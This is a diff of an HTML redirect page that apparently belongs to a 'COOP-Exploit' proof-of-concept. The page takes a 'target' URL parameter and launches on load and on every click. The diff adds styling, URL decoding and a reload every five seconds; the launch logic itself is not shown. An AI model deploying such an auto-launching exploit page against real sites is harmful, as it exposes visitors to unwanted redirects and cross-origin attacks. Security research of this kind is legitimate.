@@ -1,4 +1,9 @@
+<!DOCTYPE html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
     <style>
         body {
             background-color: white;
@@ -14,6 +19,12 @@
         #message {
             color: black;
             font-size: 20px;
+            max-width: 80%;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            background-color: #f9f9f9;
         }
     </style>
     <script type="text/javascript">
@@ -23,7 +34,7 @@
             for (let i = 0; i < varURL.length; i++) {
                 const vParam = varURL[i].split('=');
                 if (vParam[0] === qParam) {
-                    return vParam[1];
+                    return decodeURIComponent(vParam[1]);
                 }
             }
             window.location.href = "https://sp3ttr0.github.io/COOP-Exploit/";
@@ -44,18 +55,20 @@
         function setup() {
             const target = tParam("target");
             document.body.addEventListener('click', launch);
-            const message = document.createElement('div');
-            message.id = 'message';
-            message.innerText = `If the site did not automatically redirect to ${target}, click anywhere in the white background`;
-            document.body.appendChild(message);
+            const message = document.getElementById('message');
+            message.innerText = `If the site did not automatically redirect to ${target}, click anywhere in the white background.`;
             launch();
         }
 
-        window.onload = setup;
-</script>
+        window.onload = function () {
+            setup();
+            setTimeout(() => {
+                location.reload();
+            }, 5000);
+        };
+    </script>
 </head>
 <body>
-    <script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;rayId&quot;:&quot;929e782ace685def&quot;,&quot;version&quot;:&quot;2025.3.0&quot;,&quot;r&quot;:1,&quot;token&quot;:&quot;51f5fe5782b34c2fa33e0d282b8d9d75&quot;,&quot;serverTiming&quot;:{&quot;name&quot;:{&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfSpeedBrain&quot;:true,&quot;cfCacheStatus&quot;:true}}}" crossorigin="anonymous"></script>
-
-
-<div id="message">If the site did not automatically redirect to https://www.startupschool.org/, click anywhere in the white background</div></body>
+    <div id="message">If the site did not automatically redirect, click anywhere in the white background.</div>
+</body>
+</html>
